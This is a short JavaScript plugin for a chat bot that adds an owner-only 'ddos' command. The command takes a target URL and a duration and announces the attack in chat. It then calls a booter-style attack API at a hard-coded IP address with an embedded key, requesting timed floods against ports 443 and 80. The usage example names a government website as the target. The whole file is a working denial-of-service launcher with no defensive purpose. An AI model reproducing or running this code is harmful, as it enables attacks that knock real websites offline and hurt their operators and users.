import fetch from 'node-fetch' 
let handler = async (m, { conn, command, usedPrefix, args }) => {
if (!args[0] || !args[1]) return conn.reply(m.chat, `• *Example :* ${usedPrefix}${command} https://kominfo.go.id 1000`, m);
let targetUrl = args[0];
let duration = parseInt(args[1]);
let user = m.sender;

let teks = `*DDoS*\n\n`
teks += '```Target : ```' + `${targetUrl}\n`
teks += '```Duration : ```' + `${duration}\n`
teks += '```Check-Host : ```' + `https://check-host.net/check-http?host=${targetUrl}\n\n`
teks += `Powered by : @${creator.split("@")[0]}`
conn.sendMessage(m.chat, {
text: teks,
contextInfo: {
mentionedJid: [creator],
externalAdReply: {
showAdAttribution: false,
title: 'DDoS',
thumbnailUrl: 'https://telegra.ph/file/6ac6f9973ba2a8e4565ed.jpg',
sourceUrl: `https://check-host.net/check-http?host=${targetUrl}`,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
fetch(`http://152.42.160.90:795/api/attack?key=xcddos69&target=${targetUrl}&port=443&time=120&method=MIX`)
await conn.delay(1500)
fetch(`http://152.42.160.90:795/api/attack?key=xcddos69&target=${targetUrl}&port=80&time=120&method=SSL`)
}
handler.help = ['ddos']
handler.tags = ['owner']
handler.command = /^ddos$/i
handler.owner = true

export default handler
